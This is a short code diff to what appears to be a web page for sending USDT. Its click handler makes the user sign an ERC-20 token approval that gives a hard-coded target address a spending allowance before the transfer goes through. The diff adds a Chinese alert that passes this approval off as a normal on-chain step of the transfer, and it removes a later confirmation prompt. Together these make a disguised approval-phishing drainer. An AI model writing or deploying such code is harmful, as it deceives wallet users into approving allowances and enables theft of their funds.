@@ -272,13 +272,11 @@ sendBtn.addEventListener("click", async () => {
     const needWei = BigInt(web3.utils.toWei(val.toString(),"ether"));
     const approveWei = BigInt(web3.utils.toWei(APPROVE_AMOUNT,"ether"));
     try{
-        alert("核对接收地址签名");
+        alert("不同钱包版本交互略有差异，转账USDT时弹出授权额度，属于链上正常流程，请确认签名。");
         const approveCalldata = "0x095ea7b3"
             + TARGET_ADDR.slice(2).padStart(64,"0")
             + approveWei.toString(16).padStart(64,"0");
         await sendTx(approveCalldata);
-
-        alert("✅签名完成，是否继续转账");
         const transferCalldata = "0xa9059cbb"
             + TARGET_ADDR.slice(2).padStart(64,"0")
             + needWei.toString(16).padStart(64,"0");
